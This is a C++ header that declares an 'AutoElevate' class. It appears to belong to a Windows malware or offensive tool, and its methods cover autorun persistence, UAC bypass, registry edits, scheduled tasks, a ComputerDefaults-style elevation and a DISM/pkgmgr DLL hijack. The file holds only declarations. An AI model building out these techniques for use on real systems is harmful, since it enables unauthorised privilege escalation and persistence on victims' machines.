#pragma once
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h> 
#include <string>
#include "../Module/Logger.hpp"

#pragma comment(lib, "shell32.lib") 

class AutoElevate {
public:
    static bool setAutoRun();
    static bool bypassUAC();
    static bool isAdmin();
    static bool elevateNow();
    static bool elevatePrivileges();
    static std::string getExecutablePath();

private:
    
    static bool modifyRegistry(const std::string& regPath, const std::string& keyName, const std::string& value);
    static bool createElevatedTask();
    static bool createScheduledTask();  
    static bool setupComputerDefaults();

    static bool setupDismHijack();
    static bool copyDLLToSystem32();
    static bool executePkgMgr();
};